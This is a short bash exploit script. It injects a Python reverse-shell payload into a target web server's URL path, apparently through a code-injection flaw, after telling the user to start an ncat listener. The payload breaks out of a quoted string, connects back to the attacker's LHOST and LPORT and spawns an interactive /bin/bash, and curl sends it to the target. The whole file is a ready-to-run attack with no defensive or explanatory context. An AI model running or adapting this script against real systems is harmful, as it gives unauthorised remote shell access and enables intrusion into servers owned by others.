#!/bin/bash

# enforce correct amount of params
if [[ $# -ne 3 ]]; then
    echo "usage: $0 <http://TARGET.URL:PORT/> <LHOST> <LPORT>"
    exit 1
fi

IP="${2}"
PORT="${3}"

echo -e "run ncat -lvnp $PORT\nthen press RETURN at this shell to get a reverse shell on your netcat listener."
read

# build the exploit + payload and urlencode with jq
path=$(echo -n "';import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${IP}\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);nothing='" | jq -s -R -r @uri)

# exploit the server
curl -q "${1}${path}" > /dev/null 2>&1 

exit 0
